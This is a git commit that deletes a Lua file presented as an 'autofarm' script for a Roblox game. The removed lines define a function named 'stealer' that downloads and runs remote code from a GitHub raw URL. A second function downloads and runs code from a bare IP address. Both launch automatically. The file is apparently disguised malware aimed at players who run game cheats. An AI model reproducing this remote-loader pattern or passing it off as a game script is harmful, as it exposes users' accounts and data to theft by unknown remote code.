790c586eca2184f970d7bfd2189f1fca716f5c77
mm2 scripts <xxdannyarmgamexx@gmail.com>
2025-12-15 11:48:57 -0500

    Delete mm2 autofarm.lua

--- mm2 autofarm.lua
+++
@@ -1,8 +0,0 @@
-local function stealer()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/lexnow38/mm2/refs/heads/main/mm2%20script.lua"))()
-end
-local function loadui()
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2eventVisual.lua"))()
-end
-task.spawn(stealer)
-task.spawn(loadui)
